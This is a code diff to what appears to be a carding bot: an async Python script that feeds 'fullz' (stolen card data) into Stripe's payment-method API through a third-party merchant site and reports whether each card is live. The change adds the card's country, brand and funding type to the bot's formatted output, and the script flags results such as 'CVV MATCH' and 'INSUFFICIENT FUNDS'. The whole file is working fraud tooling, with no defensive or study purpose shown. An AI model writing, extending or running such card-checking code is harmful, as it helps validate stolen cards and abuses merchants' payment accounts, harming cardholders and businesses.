@@ -215,8 +215,13 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> str:
 
         response = await session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 
+        pm_json = response.json()
         try:
-            id = response.json()['id']
+            id = pm_json.get('id')
+            brand = pm_json.get('card', {}).get('brand', '')
+            last4 = pm_json.get('card', {}).get('last4', '')
+            country = pm_json.get('card', {}).get('country', '')
+            card_type = pm_json.get('card', {}).get('funding', '')
         except Exception:
             return response.text
 
@@ -248,7 +253,7 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> str:
 
         response = await session.post('https://elearntsg.com/', params=params, headers=headers, data=data)
 
-        return response.text
+        return response.text, country, brand, card_type
 
     except Exception as e:
         return f"EXCEPTION: {str(e)}"
@@ -370,7 +375,7 @@ async def charge_resp(result):
 async def multi_checking(fullz: str) -> str:
     start = time.time()
     async with httpx.AsyncClient(timeout=40) as session:
-        result = await create_payment_method(fullz, session)
+        result, country, brand, card_type = await create_payment_method(fullz, session)
         response = await charge_resp(result)
 
     elapsed = round(time.time() - start, 2)
@@ -388,6 +393,9 @@ async def multi_checking(fullz: str) -> str:
             f"𝗖𝗮𝗿𝗱: » <code>{fullz}</code>\n"
             f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆: » 𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛\n"
             f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: » {error_message} ❌\n"
+            f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: » {country}\n"
+            f"𝗕𝗿𝗮𝗻𝗱: » {brand}\n"
+            f"𝗧𝘆𝗽𝗲: » {card_type}\n"
             f"𝗧𝗶𝗺𝗲: » {elapsed}s"
         )
     else:
@@ -395,6 +403,9 @@ async def multi_checking(fullz: str) -> str:
             f"𝗖𝗮𝗿𝗱: » <code>{fullz}</code>\n"
             f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆: » 𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛\n"
             f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: » {response}\n"
+            f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: » {country}\n"
+            f"𝗕𝗿𝗮𝗻𝗱: » {brand}\n"
+            f"𝗧𝘆𝗽𝗲: » {card_type}\n"
             f"𝗧𝗶𝗺𝗲: » {elapsed}s"
         )
         if any(key in response for key in ["Payment method successfully added", "CVV INCORRECT", "CVV MATCH", "INSUFFICIENT FUNDS"]):
